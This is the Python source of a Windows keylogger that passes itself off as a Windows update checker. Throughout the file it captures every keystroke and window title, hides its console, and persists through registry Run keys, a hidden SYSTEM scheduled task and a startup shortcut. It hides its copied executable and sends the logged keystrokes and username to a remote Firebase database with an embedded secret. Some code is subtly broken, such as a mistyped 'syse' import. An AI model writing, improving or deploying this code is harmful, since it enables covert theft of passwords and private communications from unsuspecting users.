import keyboard
import time
import os
import json
from datetime import datetime
import threading
import syse
import pygetwindow as gw
import requests
from firebase import firebase
import winreg
import ctypes
import subprocess
import tempfile
import zipfile
import io
import base64
import shutil

# Configuration - Obfuscated
config = {
    'log_file': ''.join(['sys', 'tem', '_log.txt']),
    'pending_file': ''.join(['pending', '_uploads.txt']),
    'firebase_url': 'https://keylogger-monitoring-default-rtdb.firebaseio.com/',
    'firebase_secret': 'UUSFtfZDNgv3o9jU5G6jW4MNWHufqvXDnjoOwRwd',
    'upload_interval': 60,
    'mutex_name': ''.join(['Global\\', 'Win', 'Update', 'Checker']),
    'persistence_dir': os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Update'),
    'target_exe': 'WindowsUpdate.exe'
}

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_time = time.time()
        self.last_upload = 0
        self.current_window = ""
        self.check_single_instance()
        self.hide_console()
        self.setup_persistence()
        
    def check_single_instance(self):
        """Ensure only one instance runs using mutex"""
        try:
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, config['mutex_name'])
            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                sys.exit(0)
        except:
            pass
    
    def hide_console(self):
        """Hide console window completely"""
        try:
            import win32gui, win32con
            win = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(win, win32con.SW_HIDE)
        except:
            pass
    
    def callback(self, event):
        try:
            # Get current window title
            window = gw.getActiveWindow()
            if window:
                new_window = window.title
                if new_window != self.current_window:
                    self.current_window = new_window
                    self.log += f"\n[Window: {self.current_window}]\n"
            
            # Log the key event
            name = event.name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = f"[{name.upper()}]"
            
            self.log += name
            
            # Auto-save every 100 characters
            if len(self.log) > 100:
                self.save_log()
                
        except Exception as e:
            self.log += f"[ERROR:{str(e)}]"
    
    def save_log(self):
        """Save logs locally and attempt to upload"""
        try:
            # Save to local file
            with open(config['log_file'], "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n\n[{timestamp}]\n{self.log}")
                
            # Prepare data for Firebase
            data = {
                "timestamp": datetime.now().isoformat(),
                "window": self.current_window,
                "keystrokes": self.log,
                "system": os.name,
                "username": os.getlogin()
            }
            
            # Upload to Firebase
            try:
                firebase = firebase.FirebaseApplication(config['firebase_url'], None)
                firebase.post('/keystrokes', data, params={'auth': config['firebase_secret']})
            except Exception as e:
                # If upload fails, save for later
                with open(config['pending_file'], "a") as f:
                    f.write(json.dumps(data) + "\n")
            
            self.log = ""
            
        except Exception as e:
            pass  # Silent fail
    
    def upload_pending(self):
        """Attempt to upload any pending logs"""
        try:
            if os.path.exists(config['pending_file']):
                with open(config['pending_file'], "r") as f:
                    lines = f.readlines()
                
                with open(config['pending_file'], "w") as f:
                    for line in lines:
                        try:
                            data = json.loads(line.strip())
                            firebase = firebase.FirebaseApplication(config['firebase_url'], None)
                            firebase.post('/keystrokes', data, params={'auth': config['firebase_secret']})
                        except:
                            f.write(line)  # Write back if still fails
        except:
            pass
    
    def setup_persistence(self):
        """Advanced persistence techniques"""
        try:
            # Create persistence directory if needed
            os.makedirs(config['persistence_dir'], exist_ok=True)
            
            # Method 1: Registry Run Key
            self.add_registry_persistence()
            
            # Method 2: Scheduled Task
            self.add_scheduled_task()
            
            # Method 3: Startup Folder
            self.add_startup_folder_persistence()
            
            # Copy executable to persistence location
            self.get_persistent_exe_path()
            
        except Exception as e:
            pass

    def add_registry_persistence(self):
        """Add to Windows Registry Run keys"""
        try:
            key_paths = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
            ]
            
            exe_path = os.path.join(config['persistence_dir'], config['target_exe'])
            
            for path in key_paths:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdateChecker", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
        except:
            pass

    def add_scheduled_task(self):
        """Create hidden scheduled task"""
        try:
            exe_path = os.path.join(config['persistence_dir'], config['target_exe'])
            xml_template = f"""
            <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <RegistrationInfo>
                <Description>Windows Update Checker</Description>
              </RegistrationInfo>
              <Triggers>
                <LogonTrigger>
                  <Enabled>true</Enabled>
                </LogonTrigger>
              </Triggers>
              <Principals>
                <Principal id="Author">
                  <UserId>S-1-5-18</UserId>
                  <RunLevel>HighestAvailable</RunLevel>
                </Principal>
              </Principals>
              <Settings>
                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                <AllowHardTerminate>false</AllowHardTerminate>
                <StartWhenAvailable>true</StartWhenAvailable>
                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                <IdleSettings>
                  <StopOnIdleEnd>true</StopOnIdleEnd>
                  <RestartOnIdle>false</RestartOnIdle>
                </IdleSettings>
                <AllowStartOnDemand>true</AllowStartOnDemand>
                <Enabled>true</Enabled>
                <Hidden>true</Hidden>
                <RunOnlyIfIdle>false</RunOnlyIfIdle>
                <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
                <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
                <WakeToRun>false</WakeToRun>
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <Priority>7</Priority>
              </Settings>
              <Actions Context="Author">
                <Exec>
                  <Command>"{exe_path}"</Command>
                </Exec>
              </Actions>
            </Task>
            """
            
            # Create task XML file
            xml_path = os.path.join(tempfile.gettempdir(), "task.xml")
            with open(xml_path, "w") as f:
                f.write(xml_template)
                
            # Create the task
            subprocess.run(
                ['schtasks', '/create', '/tn', 'Windows Update Checker', 
                 '/xml', xml_path, '/f'],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Delete temporary XML
            os.remove(xml_path)
        except:
            pass

    def add_startup_folder_persistence(self):
        """Add shortcut to startup folder"""
        try:
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            exe_path = os.path.join(config['persistence_dir'], config['target_exe'])
            
            # Create shortcut
            shortcut_path = os.path.join(startup_path, 'Windows Update.lnk')
            self.create_shortcut(exe_path, shortcut_path)
        except:
            pass

    def get_persistent_exe_path(self):
        """Get or create persistent executable"""
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                target_path = os.path.join(config['persistence_dir'], config['target_exe'])
                if not os.path.exists(target_path):
                    shutil.copy2(exe_path, target_path)
                    self.hide_file(target_path)
                return target_path
            else:
                target_path = os.path.join(config['persistence_dir'], config['target_exe'])
                if not os.path.exists(target_path):
                    # In a real scenario, you would compile the script here
                    # For demo purposes, we'll just copy Python executable
                    shutil.copy2(sys.executable, target_path)
                    self.hide_file(target_path)
                return target_path
        except:
            return sys.executable  # Fallback

    def hide_file(self, path):
        """Set hidden and system attributes"""
        try:
            ctypes.windll.kernel32.SetFileAttributesW(path, 2)  # FILE_ATTRIBUTE_HIDDEN
            ctypes.windll.kernel32.SetFileAttributesW(path, 4)  # FILE_ATTRIBUTE_SYSTEM
        except:
            pass

    def create_shortcut(self, target, shortcut_path):
        """Create Windows shortcut"""
        try:
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = target
            shortcut.WorkingDirectory = os.path.dirname(target)
            shortcut.save()
            self.hide_file(shortcut_path)
        except:
            pass

    def run(self):
        # Start keyboard listener
        keyboard.on_release(callback=self.callback)
        
        # Periodic save/upload
        while True:
            time.sleep(config['upload_interval'])
            if self.log:
                self.save_log()
            self.upload_pending()

if __name__ == "__main__":
    try:
        logger = KeyLogger()
        logger.run()
    except Exception as e:
        pass  # Silent failure
